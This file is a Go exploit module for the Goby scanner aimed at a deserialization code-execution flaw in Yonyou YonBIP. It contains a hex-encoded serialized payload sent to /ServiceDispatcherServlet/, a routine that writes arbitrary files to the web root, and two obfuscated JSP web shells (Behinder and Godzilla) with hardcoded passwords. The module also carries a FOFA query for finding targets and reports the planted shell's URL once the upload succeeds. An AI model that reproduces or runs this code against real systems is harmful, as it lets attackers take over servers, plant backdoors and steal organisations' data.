package exploits

import (
	"encoding/hex"
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Yonyou YonBIP ServiceDispatcher Api Deserialize Code Execution Vulnerability",
    "Description": "<p>YonBIP is an enterprise intelligence platform launched by Yonyou Software Company, aiming to help enterprises achieve digital transformation, improve operational efficiency and decision-making intelligence by integrating multiple business applications and services.</p><p>There is a deserialization code execution vulnerability in Yonyou YonBIP, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "yonyou-YonBIP",
    "Homepage": "https://www.yonyou.com/YonBIP/",
    "DisclosureDate": "2024-01-11",
    "PostTime": "2024-01-30",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "body=\"yonbip/platform/pub/welcome.do\"",
    "GobyQuery": "body=\"yonbip/platform/pub/welcome.do\"",
    "Level": "3",
    "Impact": "<p>There is a deserialization code execution vulnerability in Yonyou YonBIP, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://security.yonyou.com/#/noticeInfo?id=476\">https://security.yonyou.com/#/noticeInfo?id=476</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test98765X.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(123); %>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload",
        "Code Execution"
    ],
    "VulType": [
        "Code Execution",
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "用友 BIP ServiceDispatcher 接口远程代码执行漏洞",
            "Product": "用友-BIP",
            "Description": "<p>用友 YonBIP 是用友软件公司推出的一款企业智能化平台，旨在通过集成多种业务应用和服务，帮助企业实现数字化转型，提高运营效率和决策智能。</p><p>用友 YonBIP 存在反序列化代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://security.yonyou.com/#/noticeInfo?id=476\" target=\"_blank\">https://security.yonyou.com/#/noticeInfo?id=476</a></p>",
            "Impact": "<p>用友 YonBIP 存在反序列化代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "VulType": [
                "文件上传",
                "代码执行"
            ],
            "Tags": [
                "文件上传",
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Yonyou YonBIP ServiceDispatcher Api Deserialize Code Execution Vulnerability",
            "Product": "yonyou-YonBIP",
            "Description": "<p>YonBIP is an enterprise intelligence platform launched by Yonyou Software Company, aiming to help enterprises achieve digital transformation, improve operational efficiency and decision-making intelligence by integrating multiple business applications and services.</p><p>There is a deserialization code execution vulnerability in Yonyou YonBIP, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://security.yonyou.com/#/noticeInfo?id=476\" target=\"_blank\">https://security.yonyou.com/#/noticeInfo?id=476</a></p>",
            "Impact": "<p>There is a deserialization code execution vulnerability in Yonyou YonBIP, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "Code Execution",
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10915"
}`

	// 原生A4回显马：
	sendPayloadDWWOOOXXXXLLLL := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		postConfig := httpclient.NewPostRequestConfig("/ServiceDispatcherServlet/")
		postConfig.FollowRedirect = false
		postConfig.VerifyTls = false
		postConfig.Header.Store("serverEnable", "localserver")
		payload, _ := hex.DecodeString("00000314727189037a4829ba5d36b5f571fba6d7b53e5a8dcf40a0079dea0991f9c7102d21f8187b68fa8b8b4e69dc4fc7019c22a694b5ff62b5feb68435b12ce7ffa37721b3e3a067f55d5ea7fee151874281300485833029fe6df2095b14ea44e0a3b367068a5e193d3a905afe1a9324bb124f6be56a5999510563b576d5a3ce97591d5e8c3f926d9eee52f4c7f3b1a665cbe8afed777340d64971f5114d70d8b250d1796d5ef3ee7f32cd3c7728a20d4bb8567fbb3958afa5b1208671e5e87a8607967f2c3705c18d60240fd14a7102a9f5ca0af89e1599b1217195c58c3d8de324bd21fbd512d7bdf24685899e2135d3b8ffaa3db160100cede56855cf31a2ec49c5203da27df0415d859f12629c1589ebafce3a77062e44c145bcef05dc422eac03224e80bed4fc07ac601db565f735134d65692b45ae3931b18021bba000457fba274499d05595200e18e1500b74060be58404d144043365018ff96c6c741778d752b6b69fc30803163223d2d408ef5cd0cd0c1efe75366ae32a1caeda5a77ea184deb2624bc31da802ce67eb2dca50d1bcd202e7475672476717335cb4bbbdc2db0f3bada2dc78945bba308d994bd2e632ab3f35943267263eb39659a61bfcffb04d6a916bc7554e1fce7f2e23dec46eb668afc32454667fd335cfaed70f4396f167cfb4873db8d55093d95aaff07e70c7c2d8587aec326dfd1f6f454e607a6eccff2f8b35724f6d0393cd3906e639f569fbe9943740a55ec921cd08cebb34ae17f1b4e3936f8abc651a044b0e61ff174b865a958ef71822a334411cc1c7b89850968d116a7ef9da0772e25e0205a4165c655dd54ee847fd5ce1f0f538f4babc9ed55382b3d843f8f3c47b0e382bdec41f1508ffd0c1a558d16a864f2a625b1581fdbde42276180f8b708ecf44dffbd2088996ffed7050b2088094d82c839229aeb0f871226c650bfef28754f00efcecbad11f100400a3b492ebfcf95782562ff84507d46dcd1250d5dee7716d3908d806909b3a693f563c9564477ff3dcadae5ec34d974cda6677751eff7e74a1eeda2e9d6528135f806a8ec159f89e359cc0dc629848aca719ad6ac613d64ca5fc252b2b644c1")
		postConfig.Data = string(payload)
		return httpclient.DoHttpRequest(hostInfo, postConfig)
	}

	writeFileCOXIHJCOISSSSSS := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		if len(filename) < 1 {
			return nil, errors.New("文件名不能为空！")
		}
		if resp, err := sendPayloadDWWOOOXXXXLLLL(hostInfo); resp == nil || (resp != nil && resp.StatusCode != 200) {
			return nil, errors.New(`漏洞利用失败`)
		} else if err != nil {
			return nil, err
		}
		postConfig := httpclient.NewPostRequestConfig("/wiewoqxcl2.jsp?osdpdwmx93i=./webapps/nc_web/" + filename)
		postConfig.FollowRedirect = false
		postConfig.VerifyTls = false
		postConfig.Data = content
		if resp, err := httpclient.DoHttpRequest(hostInfo, postConfig); resp == nil || (resp != nil && resp.StatusCode != 200) {
			return nil, errors.New(`漏洞利用失败`)
		} else if err != nil {
			return nil, err
		}
		getRequestConfig := httpclient.NewGetRequestConfig("/" + filename)
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			filename := goutils.RandomHexString(6) + ".txt"
			content := goutils.RandomHexString(6)
			resp, _ := writeFileCOXIHJCOISSSSSS(hostInfo, filename, content)
			return resp != nil && strings.Contains(resp.RawBody, content)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := stepLogs.Params["attackType"].(string)
			filename := goutils.RandomHexString(6) + ".jsp"
			content := goutils.B2S(stepLogs.Params["content"])
			if attackType == "behinder" {
				/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
				content = `<%@page import="\u006a\u0061\u0076\u0061.\u0075\u0074\u0069\u006c.*,\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.*,\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0073\u0070\u0065\u0063.*"%><%!\u0063\u006c\u0061\u0073\u0073 \u0055 \u0065\u0078\u0074\u0065\u006e\u0064\u0073 \u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072{\u0055(\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 \u0063){\u0073\u0075\u0070\u0065\u0072(\u0063);}\u0070\u0075\u0062\u006c\u0069\u0063 \u0043\u006c\u0061\u0073\u0073 \u0067(\u0062\u0079\u0074\u0065 []\u0062){\u0072\u0065\u0074\u0075\u0072\u006e \u0073\u0075\u0070\u0065\u0072.\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073(\u0062,\u0030,\u0062.\u006c\u0065\u006e\u0067\u0074\u0068);}}%><%\u0069\u0066 (\u0072\u0065\u0071\u0075\u0065\u0073\u0074.\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064().\u0065\u0071\u0075\u0061\u006c\u0073("\u0050\u004f\u0053\u0054")){\u0053\u0074\u0072\u0069\u006e\u0067 \u006b="\u0065\u0034\u0035\u0065\u0033\u0032\u0039\u0066\u0065\u0062\u0035\u0064\u0039\u0032\u0035\u0062";\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0070\u0075\u0074\u0056\u0061\u006c\u0075\u0065("\u0075",\u006b);\u0043\u0069\u0070\u0068\u0065\u0072 \u0063=\u0043\u0069\u0070\u0068\u0065\u0072.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065("\u0041\u0045\u0053");\u0063.\u0069\u006e\u0069\u0074(\u0032,\u006e\u0065\u0077 \u0053\u0065\u0063\u0072\u0065\u0074\u004b\u0065\u0079\u0053\u0070\u0065\u0063(\u006b.\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073(),"\u0041\u0045\u0053"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
			} else if attackType == "godzilla" {
				// 哥斯拉 pass key
				content = `<%! \u0053\u0074\u0072\u0069\u006e\u0067 \u0078\u0063="\u0033\u0063\u0036\u0065\u0030\u0062\u0038\u0061\u0039\u0063\u0031\u0035\u0032\u0032\u0034\u0061"; \u0053\u0074\u0072\u0069\u006e\u0067 \u0070\u0061\u0073\u0073="\u0070\u0061\u0073\u0073"; \u0053\u0074\u0072\u0069\u006e\u0067 \u006d\u0064\u0035=\u006d\u0064\u0035(\u0070\u0061\u0073\u0073+\u0078\u0063); \u0063\u006c\u0061\u0073\u0073 \u0058 \u0065\u0078\u0074\u0065\u006e\u0064\u0073 \u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072{\u0070\u0075\u0062\u006c\u0069\u0063 \u0058(\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 \u007a){\u0073\u0075\u0070\u0065\u0072(\u007a);}\u0070\u0075\u0062\u006c\u0069\u0063 \u0043\u006c\u0061\u0073\u0073 \u0051(\u0062\u0079\u0074\u0065[] \u0063\u0062){\u0072\u0065\u0074\u0075\u0072\u006e \u0073\u0075\u0070\u0065\u0072.\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073(\u0063\u0062, \u0030, \u0063\u0062.\u006c\u0065\u006e\u0067\u0074\u0068);} }\u0070\u0075\u0062\u006c\u0069\u0063 \u0062\u0079\u0074\u0065[] \u0078(\u0062\u0079\u0074\u0065[] \u0073,\u0062\u006f\u006f\u006c\u0065\u0061\u006e \u006d){ \u0074\u0072\u0079{\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0043\u0069\u0070\u0068\u0065\u0072 \u0063=\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0043\u0069\u0070\u0068\u0065\u0072.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065("\u0041\u0045\u0053");\u0063.\u0069\u006e\u0069\u0074(\u006d?\u0031:\u0032,\u006e\u0065\u0077 \u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0073\u0070\u0065\u0063.\u0053\u0065\u0063\u0072\u0065\u0074\u004b\u0065\u0079\u0053\u0070\u0065\u0063(\u0078\u0063.\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073(),"\u0041\u0045\u0053"));\u0072\u0065\u0074\u0075\u0072\u006e \u0063.\u0064\u006f\u0046\u0069\u006e\u0061\u006c(\u0073); }\u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065){\u0072\u0065\u0074\u0075\u0072\u006e \u006e\u0075\u006c\u006c; }} \u0070\u0075\u0062\u006c\u0069\u0063 \u0073\u0074\u0061\u0074\u0069\u0063 \u0053\u0074\u0072\u0069\u006e\u0067 \u006d\u0064\u0035(\u0053\u0074\u0072\u0069\u006e\u0067 \u0073) {\u0053\u0074\u0072\u0069\u006e\u0067 \u0072\u0065\u0074 = \u006e\u0075\u006c\u006c;\u0074\u0072\u0079 {\u006a\u0061\u0076\u0061.\u0073\u0065\u0063\u0075\u0072\u0069\u0074\u0079.\u004d\u0065\u0073\u0073\u0061\u0067\u0065\u0044\u0069\u0067\u0065\u0073\u0074 \u006d;\u006d = \u006a\u0061\u0076\u0061.\u0073\u0065\u0063\u0075\u0072\u0069\u0074\u0079.\u004d\u0065\u0073\u0073\u0061\u0067\u0065\u0044\u0069\u0067\u0065\u0073\u0074.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065("\u004d\u0044\u0035");\u006d.\u0075\u0070\u0064\u0061\u0074\u0065(\u0073.\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073(), \u0030, \u0073.\u006c\u0065\u006e\u0067\u0074\u0068());\u0072\u0065\u0074 = \u006e\u0065\u0077 \u006a\u0061\u0076\u0061.\u006d\u0061\u0074\u0068.\u0042\u0069\u0067\u0049\u006e\u0074\u0065\u0067\u0065\u0072(\u0031, \u006d.\u0064\u0069\u0067\u0065\u0073\u0074()).\u0074\u006f\u0053\u0074\u0072\u0069\u006e\u0067(\u0031\u0036).\u0074\u006f\u0055\u0070\u0070\u0065\u0072\u0043\u0061\u0073\u0065();} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065) {}\u0072\u0065\u0074\u0075\u0072\u006e \u0072\u0065\u0074; } \u0070\u0075\u0062\u006c\u0069\u0063 \u0073\u0074\u0061\u0074\u0069\u0063 \u0053\u0074\u0072\u0069\u006e\u0067 \u0062\u0061\u0073\u0065\u0036\u0034\u0045\u006e\u0063\u006f\u0064\u0065(\u0062\u0079\u0074\u0065[] \u0062\u0073) \u0074\u0068\u0072\u006f\u0077\u0073 \u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e {\u0043\u006c\u0061\u0073\u0073 \u0062\u0061\u0073\u0065\u0036\u0034;\u0053\u0074\u0072\u0069\u006e\u0067 \u0076\u0061\u006c\u0075\u0065 = \u006e\u0075\u006c\u006c;\u0074\u0072\u0079 {\u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u006a\u0061\u0076\u0061.\u0075\u0074\u0069\u006c.\u0042\u0061\u0073\u0065\u0036\u0034");\u004f\u0062\u006a\u0065\u0063\u0074 \u0045\u006e\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0067\u0065\u0074\u0045\u006e\u0063\u006f\u0064\u0065\u0072", \u006e\u0075\u006c\u006c).\u0069\u006e\u0076\u006f\u006b\u0065(\u0062\u0061\u0073\u0065\u0036\u0034, \u006e\u0075\u006c\u006c);\u0076\u0061\u006c\u0075\u0065 = (\u0053\u0074\u0072\u0069\u006e\u0067)\u0045\u006e\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0065\u006e\u0063\u006f\u0064\u0065\u0054\u006f\u0053\u0074\u0072\u0069\u006e\u0067", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0062\u0079\u0074\u0065[].\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0045\u006e\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065) {\u0074\u0072\u0079 { \u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u0073\u0075\u006e.\u006d\u0069\u0073\u0063.\u0042\u0041\u0053\u0045\u0036\u0034\u0045\u006e\u0063\u006f\u0064\u0065\u0072"); \u004f\u0062\u006a\u0065\u0063\u0074 \u0045\u006e\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065(); \u0076\u0061\u006c\u0075\u0065 = (\u0053\u0074\u0072\u0069\u006e\u0067)\u0045\u006e\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0065\u006e\u0063\u006f\u0064\u0065", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0062\u0079\u0074\u0065[].\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0045\u006e\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065\u0032) {}}\u0072\u0065\u0074\u0075\u0072\u006e \u0076\u0061\u006c\u0075\u0065; } \u0070\u0075\u0062\u006c\u0069\u0063 \u0073\u0074\u0061\u0074\u0069\u0063 \u0062\u0079\u0074\u0065[] \u0062\u0061\u0073\u0065\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065(\u0053\u0074\u0072\u0069\u006e\u0067 \u0062\u0073) \u0074\u0068\u0072\u006f\u0077\u0073 \u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e {\u0043\u006c\u0061\u0073\u0073 \u0062\u0061\u0073\u0065\u0036\u0034;\u0062\u0079\u0074\u0065[] \u0076\u0061\u006c\u0075\u0065 = \u006e\u0075\u006c\u006c;\u0074\u0072\u0079 {\u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u006a\u0061\u0076\u0061.\u0075\u0074\u0069\u006c.\u0042\u0061\u0073\u0065\u0036\u0034");\u004f\u0062\u006a\u0065\u0063\u0074 \u0064\u0065\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072", \u006e\u0075\u006c\u006c).\u0069\u006e\u0076\u006f\u006b\u0065(\u0062\u0061\u0073\u0065\u0036\u0034, \u006e\u0075\u006c\u006c);\u0076\u0061\u006c\u0075\u0065 = (\u0062\u0079\u0074\u0065[])\u0064\u0065\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0064\u0065\u0063\u006f\u0064\u0065", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0053\u0074\u0072\u0069\u006e\u0067.\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0064\u0065\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065) {\u0074\u0072\u0079 { \u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u0073\u0075\u006e.\u006d\u0069\u0073\u0063.\u0042\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072"); \u004f\u0062\u006a\u0065\u0063\u0074 \u0064\u0065\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065(); \u0076\u0061\u006c\u0075\u0065 = (\u0062\u0079\u0074\u0065[])\u0064\u0065\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0064\u0065\u0063\u006f\u0064\u0065\u0042\u0075\u0066\u0066\u0065\u0072", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0053\u0074\u0072\u0069\u006e\u0067.\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0064\u0065\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065\u0032) {}}\u0072\u0065\u0074\u0075\u0072\u006e \u0076\u0061\u006c\u0075\u0065; }%><%\u0074\u0072\u0079{\u0062\u0079\u0074\u0065[] \u0064\u0061\u0074\u0061=\u0062\u0061\u0073\u0065\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065(\u0072\u0065\u0071\u0075\u0065\u0073\u0074.\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072(\u0070\u0061\u0073\u0073));\u0064\u0061\u0074\u0061=\u0078(\u0064\u0061\u0074\u0061, \u0066\u0061\u006c\u0073\u0065);\u0069\u0066 (\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0067\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0079\u006c\u006f\u0061\u0064")==\u006e\u0075\u006c\u006c){\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0079\u006c\u006f\u0061\u0064",\u006e\u0065\u0077 \u0058(\u0074\u0068\u0069\u0073.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072()).\u0051(\u0064\u0061\u0074\u0061));}\u0065\u006c\u0073\u0065{\u0072\u0065\u0071\u0075\u0065\u0073\u0074.\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0073",\u0064\u0061\u0074\u0061);\u006a\u0061\u0076\u0061.\u0069\u006f.\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d \u0061\u0072\u0072\u004f\u0075\u0074=\u006e\u0065\u0077 \u006a\u0061\u0076\u0061.\u0069\u006f.\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d();\u004f\u0062\u006a\u0065\u0063\u0074 \u0066=((\u0043\u006c\u0061\u0073\u0073)\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0067\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0079\u006c\u006f\u0061\u0064")).\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065();\u0066.\u0065\u0071\u0075\u0061\u006c\u0073(\u0061\u0072\u0072\u004f\u0075\u0074);\u0066.\u0065\u0071\u0075\u0061\u006c\u0073(\u0070\u0061\u0067\u0065\u0043\u006f\u006e\u0074\u0065\u0078\u0074);\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065.\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072().\u0077\u0072\u0069\u0074\u0065(\u006d\u0064\u0035.\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006e\u0067(\u0030,\u0031\u0036));\u0066.\u0074\u006f\u0053\u0074\u0072\u0069\u006e\u0067();\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065.\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072().\u0077\u0072\u0069\u0074\u0065(\u0062\u0061\u0073\u0065\u0036\u0034\u0045\u006e\u0063\u006f\u0064\u0065(\u0078(\u0061\u0072\u0072\u004f\u0075\u0074.\u0074\u006f\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079(), \u0074\u0072\u0075\u0065)));\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065.\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072().\u0077\u0072\u0069\u0074\u0065(\u006d\u0064\u0035.\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006e\u0067(\u0031\u0036));} }\u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065){}
%>`
			} else if attackType == "custom" {
				filename = goutils.B2S(stepLogs.Params["filename"])
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			if resp, err := writeFileCOXIHJCOISSSSSS(expResult.HostInfo, filename, content); resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
				if attackType == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if attackType == "godzilla" {
					expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
				expResult.Output += "Webshell type: jsp"
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
